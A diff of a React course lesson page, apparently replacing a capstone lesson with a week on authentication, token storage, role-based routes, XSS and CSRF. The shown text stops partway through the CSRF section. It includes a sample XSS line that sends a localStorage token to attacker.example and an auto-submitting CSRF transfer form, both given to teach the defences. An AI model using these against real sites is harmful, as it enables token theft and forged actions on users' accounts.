@@ -14,8 +14,8 @@
 </script>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Weeks 25–26: Capstone — Ship a Production React Application — CodeVerse Creatives</title>
-<meta name="description" content="The capstone of the React curriculum: plan, build, test, optimize and deploy a complete production React application combining routing, server state, global state, testing and performance work." />
+<title>Week 25: Security, Authentication &amp; Authorization — CodeVerse Creatives</title>
+<meta name="description" content="Week 25 of the React curriculum: session vs. JWT vs. OAuth/OIDC auth flows, token storage tradeoffs, protected routes with role-based access control, and preventing XSS/CSRF in React apps." />
 <link rel="icon" href="../../assets/favicons/favicon.svg" type="image/svg+xml" />
 <link rel="icon" href="../../assets/favicons/favicon.ico" sizes="any" />
 <link rel="icon" href="../../assets/favicons/favicon-32x32.png" sizes="32x32" type="image/png" />
@@ -63,7 +63,7 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="2.5"/><ellipse cx="12" cy="12" rx="10" ry="4.2"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(60 12 12)"/><ellipse cx="12" cy="12" rx="10" ry="4.2" transform="rotate(120 12 12)"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">React</span>
-              <span class="nav-course-card__meta">26 Weeks</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
             </span>
           </a>
           <a href="../llm-ml/index.html" class="nav-course-card c-llm-ml">
@@ -77,21 +77,21 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="6" rx="1"/><rect x="2" y="15" width="20" height="6" rx="1"/><path d="M6 6h.01M6 18h.01"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Spring Boot</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../devops-cloud/index.html" class="nav-course-card c-devops-cloud">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19H9a5 5 0 1 1 .87-9.92A6 6 0 0 1 21 11a4 4 0 0 1-.5 8Z"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">DevOps &amp; Cloud</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../python/index.html" class="nav-course-card c-python">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2c-2 0-4 .5-4 2v3h4v1H6c-1.5 0-3 1-3 4s1.5 4 3 4h2v-2.5c0-1.5 1-2.5 2.5-2.5h4c1 0 2-1 2-2V4c0-1.5-2-2-4.5-2Z"/><path d="M12 22c2 0 4-.5 4-2v-3h-4v-1h6c1.5 0 3-1 3-4s-1.5-4-3-4h-2v2.5c0 1.5-1 2.5-2.5 2.5h-4c-1 0-2 1-2 2v4c0 1.5 2 2 4.5 2Z"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Python</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../dsa-cpp/index.html" class="nav-course-card c-dsa-cpp">
@@ -105,14 +105,14 @@
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">System Design</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">28 Weeks</span>
             </span>
           </a>
           <a href="../node-express/index.html" class="nav-course-card c-node-express">
             <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 21 6.5 21 15.5 12 20 3 15.5 3 6.5 12 2"/><path d="M9 9.5c1.5-1 3.5-1 5 0M8 13c2 1.5 6 1.5 8 0"/></svg></span>
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">Node.js &amp; Express</span>
-              <span class="nav-course-card__meta">15 Weeks</span>
+              <span class="nav-course-card__meta">26 Weeks</span>
             </span>
           </a>
           <a href="../servicenow/index.html" class="nav-course-card c-servicenow">
@@ -120,6 +120,13 @@
             <span class="nav-course-card__text">
               <span class="nav-course-card__title">ServiceNow</span>
               <span class="nav-course-card__meta">26 Weeks</span>
+            </span>
+          </a>
+          <a href="../aptitude/index.html" class="nav-course-card c-aptitude">
+            <span class="nav-course-card__icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="3" width="16" height="18" rx="2"/><line x1="8" y1="7" x2="16" y2="7"/><line x1="8" y1="12" x2="8" y2="12"/><line x1="12" y1="12" x2="12" y2="12"/><line x1="16" y1="12" x2="16" y2="12"/><line x1="8" y1="16" x2="8" y2="16"/><line x1="12" y1="16" x2="12" y2="16"/><line x1="16" y1="16" x2="16" y2="16"/><line x1="8" y1="20" x2="8" y2="20"/><line x1="12" y1="20" x2="12" y2="20"/></svg></span>
+            <span class="nav-course-card__text">
+              <span class="nav-course-card__title">Numerical Aptitude</span>
+              <span class="nav-course-card__meta">20 Weeks</span>
             </span>
           </a>
         </div>
@@ -145,43 +152,44 @@
       <div class="lesson-crumb">
         <a href="../react/index.html">React Syllabus</a>
         <span>/</span>
-        <a href="../react/index.html#timeline">Module 17 · Capstone</a>
+        <a href="../react/index.html#timeline">Module 15 · Security &amp; Authentication</a>
         <span>/</span>
-        <span aria-current="page">Weeks 25–26</span>
+        <span aria-current="page">Week 25</span>
       </div>
 
-      <h1>Weeks 25–26 · Capstone: Ship a Production React Application</h1>
+      <h1>Week 25: Security, Authentication &amp; Authorization</h1>
       <p class="lesson-header__lede">
-        No new concepts this time — every idea you need already exists somewhere in Weeks 1–21.
-        This is where you combine them: plan a real application, route and structure it properly,
-        manage its data with the right tool for each kind of state, test and optimize it, and get
-        it in front of someone — deployed, and yours.
+        Week 7's protected routes assumed the hard part was already solved — an <code>isLoggedIn</code>
+        flag just existed, and <code>RequireAuth</code> read it. This week builds the real thing
+        underneath that flag: how a browser and a server actually agree that a user is who they say
+        they are, where it's safe to keep the proof of that agreement, and how to stop a React app
+        from being trivially exploitable by the two attacks that target it most: XSS and CSRF.
       </p>
 
       <div class="lesson-meta">
-        <span class="chip chip--accent">Module 17 of 17</span>
-        <span class="chip">Weeks 25–26 of 26</span>
-        <span class="chip">~10–14 Hours</span>
-        <span class="chip">Capstone Project</span>
+        <span class="chip chip--accent">Module 15 of 17</span>
+        <span class="chip">Week 25 of 28</span>
+        <span class="chip">~3–4 Hours</span>
+        <span class="chip">Hands-on Exercise Included</span>
       </div>
 
       <div class="obj-recap reveal">
-        <h2>By the end of this capstone, you'll be able to</h2>
+        <h2>By the end of this week, you'll be able to</h2>
         <ul>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Scope and architect a real React application end to end, justifying every major decision</li>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Combine routing, server state, global state, testing and performance work into one working app</li>
-          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Deploy it and present it as a portfolio piece</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Explain the tradeoffs between session-cookie, JWT, and OAuth/OIDC auth flows and pick the right one for a given app</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Store auth tokens securely, and explain why <code>localStorage</code> is usually the wrong answer</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Protect routes with role-based access control and prevent the most common React-specific XSS/CSRF mistakes</li>
         </ul>
       </div>
 
       <div class="phase-nav">
-        <a href="#planning"><span>1</span> Project Planning &amp; Scoping</a>
-        <a href="#architecture"><span>2</span> Architecture Decisions</a>
-        <a href="#implementation"><span>3</span> Full Implementation</a>
-        <a href="#quality-pass"><span>4</span> Testing, Performance &amp; Accessibility Pass</a>
-        <a href="#deployment"><span>5</span> Deployment &amp; Portfolio Write-Up</a>
-        <a href="#project"><span>6</span> The Capstone Project</a>
-        <a href="#checklist"><span>7</span> Final Checklist</a>
+        <a href="#auth-flows"><span>1</span> Auth Flows: Session vs. JWT vs. OAuth/OIDC</a>
+        <a href="#token-storage"><span>2</span> Token Storage Tradeoffs</a>
+        <a href="#protected-routes-rbac"><span>3</span> Protected Routes &amp; RBAC</a>
+        <a href="#xss-prevention"><span>4</span> XSS Prevention &amp; Sanitizing Content</a>
+        <a href="#csrf-secure-api"><span>5</span> CSRF &amp; Secure API Calls</a>
+        <a href="#exercise"><span>6</span> Exercise</a>
+        <a href="#quiz"><span>7</span> Knowledge Check</a>
       </div>
     </div>
   </section>
@@ -192,196 +200,521 @@
       <div class="lesson-layout">
         <article class="lesson-article">
 
-          <section id="planning">
-            <h2>1. Project Planning &amp; Scoping</h2>
+          <section id="auth-flows">
+            <h2>1. Auth Flows: Session vs. JWT vs. OAuth/OIDC</h2>
             <p>
-              Before writing any code, write down what this application actually does, for whom,
-              and what "working" concretely means:
+              "Authentication" isn't one thing — it's a family of different mechanisms for the same
+              underlying handshake: prove who you are once, then get treated as that identity on
+              every request afterward without re-proving it each time. Three flows cover the vast
+              majority of real apps, and each makes a different tradeoff.
             </p>
-            <ul>
-              <li><strong>What's the core user flow?</strong> — the one thing someone opens this app to do (track expenses, browse and save recipes, manage a small team's tasks).</li>
-              <li><strong>What data does it need?</strong> — what's read (Week 8), what's written (Week 9), and what's genuinely shared client state versus per-component state (Week 10).</li>
-              <li><strong>How many distinct pages/routes does it need?</strong> — enough to exercise Weeks 6–7's routing meaningfully, without padding the scope with pages nobody needs.</li>
-              <li><strong>What does "done" look like, measurably?</strong> — a specific list of user flows that must work, decided now rather than invented retroactively to match whatever got built.</li>
-            </ul>
-            <p>
-              Scope deliberately small and real rather than large and ambitious — a well-built
-              three-page app with solid data handling, tests, and a working deploy is a stronger
-              capstone than an ambitious ten-page app that's untested and half-finished.
-            </p>
-          </section>
 
-          <section id="architecture">
-            <h2>2. Architecture Decisions &amp; Tradeoffs</h2>
-            <p>
-              With the app scoped, make deliberate choices using the course's own frameworks —
-              and be ready to explain each one, not just make it:
-            </p>
             <ul>
-              <li><strong>Rendering strategy (Weeks 18–19)</strong> — a Next.js app if you want server rendering, static generation, or SEO to matter; a Vite SPA (Weeks 1–17's stack) if the app is fully behind a login and client-rendering is simpler for your scope.</li>
-              <li><strong>Server state (Weeks 8–9)</strong> — TanStack Query for anything fetched from an API, with query keys planned out before you start wiring up components.</li>
-              <li><strong>Global client state (Week 10)</strong> — Context for a small amount of infrequently-changing state (theme, auth), Zustand if there's real app-wide state that changes often; justify whichever you pick, or neither, over the other.</li>
-              <li><strong>Component architecture (Week 12)</strong> — a feature-based folder structure from the start, and at least one compound or composed component where the UI genuinely calls for one.</li>
+              <li><strong>Server session + cookie</strong> — the server generates a random session ID on login, stores the session's data (user ID, roles) in its own store (Redis, a database table), and sends the browser only the ID, in a cookie. Every request, the browser automatically attaches that cookie, and the server looks the session up. Simple to reason about, and revoking access is instant — delete the row. The cost: the server has to keep state for every logged-in user, which complicates scaling across multiple server instances unless the session store is shared.</li>
+              <li><strong>JWT (JSON Web Token)</strong> — the server signs a token containing the user's identity and claims directly, and hands the whole token to the client. Any server holding the same signing secret can verify it without a database lookup — genuinely <strong>stateless</strong>, which scales trivially across instances. The cost: a JWT is valid until it expires, full stop. There's no "delete the row" — revoking a single compromised token before its expiry requires extra machinery (a denylist, short expiries plus refresh tokens) that reintroduces some of the state you were trying to avoid.</li>
+              <li><strong>OAuth 2.0 / OpenID Connect (OIDC)</strong> — you don't verify credentials at all. The user authenticates with a third party (Google, GitHub, Auth0, Okta), and that party hands your app a token vouching for who the user is (OIDC layers "identity" on top of OAuth's "authorization"). Right for when you don't want to own passwords, want a faster signup flow, or need to act on a user's behalf against a third-party API (reading their Google Calendar, for instance).</li>
             </ul>
-            <p>
-              Justify each piece: "I used TanStack Query because this app's core data lives on a
-              server and needs caching across several pages" is a real architectural decision;
-              "I used Redux Toolkit because it's what I know" is not — Week 10 gave you the
-              framework to make this choice deliberately.
-            </p>
-          </section>
 
-          <section id="implementation">
-            <h2>3. Full Implementation, in a Sensible Order</h2>
-            <p>
-              Build in an order that lets you validate each layer before adding the next — the
-              same incremental discipline from Week 9's exercise, now spanning the whole app:
-            </p>
             <div class="code-block">
-              <div class="code-block__label">a sensible build order</div>
-              <pre><code># 1. Static shell first: routes, layouts, navigation (Weeks 6-7 or 18-19) -- no data yet
-# 2. Read paths: wire up queries for every page that displays data (Week 8)
-# 3. Write paths: forms and mutations, with invalidation (Weeks 5, 9)
-# 4. Global/shared state ONLY where the app genuinely needs it (Week 10)
-# 5. Error boundaries and Suspense around anything that can fail or take time (Week 13)
-# 6. Styling and accessibility pass -- not deferred to "later" (Week 21)
+              <div class="code-block__label">example — session login response (server sets the cookie)</div>
+              <pre><code>POST /api/login
+Set-Cookie: session_id=8f3e...c1a; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=604800
+
+{ "user": { "id": 42, "name": "Priya" } } // no token in the JSON body at all
 </code></pre>
             </div>
+
+            <div class="code-block">
+              <div class="code-block__label">example — decoded JWT payload (never store secrets here — it's readable, not encrypted)</div>
+              <pre><code>{
+  "sub": "42",
+  "name": "Priya",
+  "role": "editor",
+  "iat": 1735689600, // issued at
+  "exp": 1735693200  // expires 1 hour later
+}
+</code></pre>
+            </div>
+
             <p>
-              This order matters for the same reason Week 8's article emphasized it: it's far
-              cheaper to discover your data model needs to change while the shell is still simple,
-              than after forms, mutations, and global state are all built on top of an assumption
-              that turns out to be wrong.
+              That last point about JWTs is easy to miss: a JWT's payload is <strong>base64-encoded,
+              not encrypted</strong>. Anyone holding the token — including the user themselves,
+              via their browser dev tools — can read every claim inside it. The signature only
+              proves the server issued it unmodified; it proves nothing about secrecy.
             </p>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Picking one</strong>
+                <p>Single backend, want instant revocation and simplicity: server sessions. Multiple independently-scaled services that all need to verify identity without a shared session store: JWT. Don't want to own credential storage, or need delegated access to a third-party API: OAuth/OIDC. Plenty of real apps combine two — OIDC for login, then a short-lived session cookie for everything after.</p>
+              </div>
+            </div>
           </section>
 
-          <section id="quality-pass">
-            <h2>4. Testing, Performance &amp; Accessibility Pass</h2>
+          <section id="token-storage">
+            <h2>2. Token Storage Tradeoffs</h2>
             <p>
-              Apply Weeks 14–15, 16–17, and 21 in full, not as an afterthought:
+              Choosing an auth flow answers "how do we prove identity." A separate, equally
+              important question: once you have a token or session ID, <strong>where does it live
+              in the browser</strong>? Get this wrong and the flow you chose in Section 1 stops
+              mattering.
             </p>
-            <ul>
-              <li><strong>Test coverage (Weeks 14–15)</strong> — component tests for your core user flow using RTL, with network calls mocked via MSW; at least one Playwright e2e test covering the single most important path end to end.</li>
-              <li><strong>A profiling pass (Week 16)</strong> — record at least one interaction with React DevTools Profiler, and fix anything that shows an unnecessary re-render or a genuinely slow computation.</li>
-              <li><strong>Code-splitting (Week 16)</strong> — at least one route or heavy component lazy-loaded, confirmed via the Network tab.</li>
-              <li><strong>Accessibility (Week 21)</strong> — a clean <code>jest-axe</code> pass on your core pages, full keyboard operability confirmed by hand (mouse unplugged), and a Lighthouse accessibility score you'd be comfortable showing someone.</li>
-            </ul>
+
+            <p>
+              <code>localStorage</code> is the option that looks convenient and is usually the wrong
+              answer. It's plain JavaScript-readable storage — which means <strong>any script running
+              on your page can read it</strong>, including a script that shouldn't be there at all.
+              If your app has even one XSS vulnerability (Section 4) — a single unsanitized
+              <code>dangerouslySetInnerHTML</code>, a compromised third-party npm package, an ad
+              script — an attacker's injected code can do <code>localStorage.getItem('token')</code>
+              and exfiltrate it to their own server in one line. No cookie theft, no network
+              interception required; the token was sitting in a place JavaScript was always allowed
+              to read.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">what an XSS payload can do if the token lives in localStorage</div>
+              <pre><code>// injected via any unsanitized render path -- see Section 4
+const stolen = localStorage.getItem('authToken');
+fetch('https://attacker.example/collect?t=' + stolen); // token is now theirs
+</code></pre>
+            </div>
+
+            <p>
+              An <code>httpOnly</code> cookie closes exactly this hole: it's marked so that
+              <strong>JavaScript cannot read it at all</strong> — not <code>document.cookie</code>,
+              not any library, nothing running on the page. The browser still attaches it to requests
+              automatically, so the server can still authenticate the user; client-side code simply
+              never touches the credential. The tradeoff is that a cookie-based session opens the
+              door to a different attack, CSRF, covered in Section 5 — httpOnly cookies aren't a free
+              upgrade, they trade one risk for a different, more containable one.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">server — login endpoint sets an httpOnly cookie, never returns a token in the body (Express)</div>
+              <pre><code>app.post('/api/login', async (req, res) =&gt; {
+  const { email, password } = req.body;
+  const user = await verifyCredentials(email, password);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  const token = signToken({ sub: user.id, role: user.role }); // JWT, but never sent to JS
+
+  res.cookie('authToken', token, {
+    httpOnly: true,               // invisible to document.cookie / any JS
+    secure: true,                 // only sent over HTTPS
+    sameSite: 'lax',              // mitigates CSRF -- see Section 5
+    maxAge: 60 * 60 * 1000,       // 1 hour
+  });
+
+  res.json({ user: { id: user.id, name: user.name } }); // no token here
+});
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">client — no token ever touches JS; the browser attaches the cookie automatically</div>
+              <pre><code>async function login(email: string, password: string) {
+  const res = await fetch('/api/login', {
+    method: 'POST',
+    credentials: 'include', // send/receive cookies on this cross-origin-capable request
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email, password }),
+  });
+  return res.json(); // { user: { id, name } } -- that's all the client ever sees
+}
+
+// every later authenticated request just needs credentials: 'include' --
+// no Authorization header to manage, no token to remember to attach
+async function getProfile() {
+  const res = await fetch('/api/profile', { credentials: 'include' });
+  return res.json();
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>What about a plain in-memory variable?</strong>
+                <p>Keeping a token in a React state variable (not <code>localStorage</code>) is still readable by any injected script <em>while that script runs</em>, but at least doesn't persist it for an attacker to grab later or across tabs. It's a real improvement over <code>localStorage</code>, but an httpOnly cookie remains the stronger default whenever your frontend and API share a domain (or a configured cross-subdomain cookie) — it removes the token from JS's reach entirely, not just from persistent storage.</p>
+              </div>
+            </div>
           </section>
 
-          <section id="deployment">
-            <h2>5. Deployment &amp; Portfolio Write-Up</h2>
+          <section id="protected-routes-rbac">
+            <h2>3. Protected Routes &amp; Role-Based Access Control</h2>
             <p>
-              A working app nobody else can see is much less useful as a portfolio piece than a
-              modest, deployed one. Deploy to Vercel (for a Next.js app) or a static host like
-              Netlify (for a Vite SPA) — both have a free tier sufficient for a capstone project.
+              Week 7's <code>RequireAuth</code> answered one question — is anyone logged in? Most
+              real apps need a second, sharper question: is <em>this</em> logged-in user allowed to
+              see <em>this</em> page? An admin dashboard shouldn't render for a user whose role is
+              <code>"viewer"</code>, even though they're fully authenticated.
             </p>
-            <ul>
-              <li><strong>The problem and who it's for</strong> — one paragraph, from Section 1's scoping.</li>
-              <li><strong>Architecture decisions and why</strong> — the choices from Section 2, and the reasoning behind each, not just the final list of libraries.</li>
-              <li><strong>What you tested, and how</strong> — your Weeks 14–15 coverage, honestly described, including anything you chose not to test and why.</li>
-              <li><strong>Performance and accessibility numbers</strong> — real Lighthouse scores, real profiler findings you fixed, not vague claims.</li>
-              <li><strong>A live link</strong> — the deployed app itself is the actual deliverable a reader will judge the whole project by.</li>
-            </ul>
+
+            <div class="code-block">
+              <div class="code-block__label">RequireRole.tsx — extends Week 7's RequireAuth with a role check</div>
+              <pre><code>import { Navigate, Outlet, useLocation } from 'react-router';
+import { useAuth } from './useAuth';
+
+type Role = 'viewer' | 'editor' | 'admin';
+
+function RequireRole({ role }: { role: Role }) {
+  const { user } = useAuth();
+  const location = useLocation();
+
+  if (!user) {
+    // not logged in at all -- same redirect Week 7 used
+    return &lt;Navigate to="/login" state={{ from: location }} replace /&gt;;
+  }
+
+  if (user.role !== role) {
+    // logged in, but the wrong role -- a different destination than "please log in"
+    return &lt;Navigate to="/forbidden" replace /&gt;;
+  }
+
+  return &lt;Outlet /&gt;;
+}
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">route config -- wrapping only the admin subtree</div>
+              <pre><code>const router = createBrowserRouter([
+  { path: '/login', element: &lt;LoginPage /&gt; },
+  { path: '/forbidden', element: &lt;ForbiddenPage /&gt; },
+  {
+    element: &lt;RequireAuth /&gt;, // Week 7 -- must be logged in at all
+    children: [
+      { path: '/dashboard', element: &lt;DashboardPage /&gt; },
+      {
+        element: &lt;RequireRole role="admin" /&gt;, // additionally, must be an admin
+        children: [
+          { path: '/admin', element: &lt;AdminPage /&gt; },
+          { path: '/admin/users', element: &lt;AdminUsersPage /&gt; },
+        ],
+      },
+    ],
+  },
+]);
+</code></pre>
+            </div>
+
+            <p>
+              Stacking wrapper routes like this composes cleanly: <code>/admin</code> is nested
+              inside both <code>RequireAuth</code> and <code>RequireRole</code>, so an unauthenticated
+              visitor bounces to <code>/login</code> and an authenticated non-admin bounces to
+              <code>/forbidden</code> — two different, correct outcomes from one route tree.
+            </p>
+
+            <p>
+              The same check belongs in a <strong>loader</strong> (Week 7) too, not only a wrapper
+              component — useful when the redirect decision should happen before any of the route's
+              elements render at all, particularly for a route with its own data-fetching loader:
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">requireRole.ts -- a loader-level guard</div>
+              <pre><code>import { redirect } from 'react-router';
+import { getCurrentUser } from './auth';
+
+function requireRole(role: 'viewer' | 'editor' | 'admin') {
+  return async () =&gt; {
+    const user = await getCurrentUser(); // reads the session, e.g. via /api/me
+    if (!user) throw redirect('/login');
+    if (user.role !== role) throw redirect('/forbidden');
+    return user;
+  };
+}
+
+// route config
+{
+  path: '/admin/users',
+  element: &lt;AdminUsersPage /&gt;,
+  loader: requireRole('admin'),
+}
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>Still not a security boundary</strong>
+                <p>Exactly like Week 7's warning: <code>RequireRole</code> and <code>requireRole</code> loaders control what renders in the browser, nothing more. The <code>/api/admin/users</code> endpoint itself must independently check the caller's role on the server, every request — a client-side check is convenience for legitimate users, not a wall against anyone willing to call the API directly.</p>
+              </div>
+            </div>
           </section>
 
-          <section id="project">
-            <h2>6. The Capstone Project</h2>
+          <section id="xss-prevention">
+            <h2>4. XSS Prevention &amp; Sanitizing User Content</h2>
+            <p>
+              Cross-site scripting (XSS) is an attacker getting their own JavaScript to run inside
+              your page, in your users' browsers, under your origin — which is exactly what makes
+              Section 2's <code>localStorage</code> token theft possible, and much worse besides.
+              React's default behavior already closes the most common door: when you render
+              <code>{'{someString}'}</code> in JSX, React escapes it as text, not HTML. A comment
+              containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> renders as the literal
+              visible text of that string, not as an executed script tag.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">safe by default -- JSX escapes this automatically</div>
+              <pre><code>function Comment({ text }: { text: string }) {
+  return &lt;p&gt;{text}&lt;/p&gt;; // even if text is "&lt;img src=x onerror=alert(1)&gt;", it renders as inert text
+}
+</code></pre>
+            </div>
+
+            <p>
+              The risk reappears the moment you opt out of that default with
+              <code>dangerouslySetInnerHTML</code> — a prop that's honestly named: it hands React a
+              raw HTML string and tells it to inject that HTML directly into the DOM, script tags,
+              event handlers and all, with zero escaping. It exists because some content is
+              legitimately meant to be rendered <em>as</em> HTML — a rich-text editor's output, a
+              CMS field, a Markdown-to-HTML conversion — not because it's ever safe to point directly
+              at unvalidated user input.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the unsafe version -- never do this with user-supplied content</div>
+              <pre><code>function Comment({ html }: { html: string }) {
+  // html came from another user's input. This executes anything they put in it.
+  return &lt;div dangerouslySetInnerHTML={{ __html: html }} /&gt;;
+}
+</code></pre>
+            </div>
+
+            <p>
+              The fix isn't to avoid rich HTML content — it's to <strong>sanitize</strong> it first,
+              stripping anything that isn't safe to render (script tags, <code>onerror</code>/<code>onclick</code>
+              handlers, <code>javascript:</code> URLs) while keeping legitimate formatting tags
+              (<code>&lt;b&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;p&gt;</code>) intact.
+              <a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noreferrer">DOMPurify</a>
+              is the standard tool for this:
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">terminal</div>
+              <pre><code>npm install dompurify
+npm install -D @types/dompurify
+</code></pre>
+            </div>
+
+            <div class="code-block">
+              <div class="code-block__label">SafeComment.tsx -- sanitize before rendering, every time</div>
+              <pre><code>import DOMPurify from 'dompurify';
+
+function SafeComment({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
+    ALLOWED_ATTR: ['href', 'target', 'rel'],
+  });
+
+  return &lt;div dangerouslySetInnerHTML={{ __html: clean }} /&gt;;
+}
+
+// &lt;SafeComment html="Nice work! &lt;script&gt;stealCookies()&lt;/script&gt;" /&gt;
+// renders: "Nice work! " -- the script tag is stripped entirely, nothing executes
+</code></pre>
+            </div>
+
+            <div class="callout callout--tip">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
+              <div>
+                <strong>The actual rule</strong>
+                <p>If the content is a plain string, JSX already protects you — just render it normally. If it must be rendered as HTML, it must pass through a sanitizer immediately before <code>dangerouslySetInnerHTML</code>, with no exceptions for "trusted" sources — a compromised admin account or a hacked CMS is still user-supplied content from your app's perspective.</p>
+              </div>
+            </div>
+          </section>
+
+          <section id="csrf-secure-api">
+            <h2>5. CSRF &amp; Secure API Calls</h2>
+            <p>
+              Cross-site request forgery (CSRF) targets cookie-based auth specifically — it doesn't
+              touch JWT-in-an-<code>Authorization</code>-header setups at all, because that pattern
+              requires JavaScript on your own origin to attach the token, and a malicious site can't
+              read or set headers on requests to your API. A cookie, on the other hand, is
+              attached by the browser <strong>automatically</strong>, to requests from any site —
+              which is exactly the mechanism CSRF abuses.
+            </p>
+
+            <p>
+              The attack: a user is logged into <code>bank.example</code> (session cookie set). They
+              then visit <code>evil.example</code>, which contains a hidden form auto-submitting a
+              POST to <code>bank.example/api/transfer</code>. The browser dutifully attaches the
+              <code>bank.example</code> session cookie to that request — because it doesn't know or
+              care which site's HTML triggered it — and the transfer executes as if the real user
+              requested it, because as far as the server can tell, they did.
+            </p>
+
+            <div class="code-block">
+              <div class="code-block__label">the attack -- hosted on a completely different site</div>
+              <pre><code>&lt;!-- evil.example --&gt;
+&lt;form action="https://bank.example/api/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker-account" /&gt;
+  &lt;input type="hidden" name="amount" value="5000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+&lt;!-- the browser attaches bank.example's session cookie automatically -- no consent needed --&gt;
+</code></pre>
+            </div>
+
+            <p>
+              The <strong><code>SameSite</code></strong> cookie attribute is the first line of
+              defense, and it's the one already set in Section 2's login example.
+              <code>SameSite=Strict</code> tells the browser to never send that cookie on a
+              cross-site request, period — the evil.example form above would submit with no
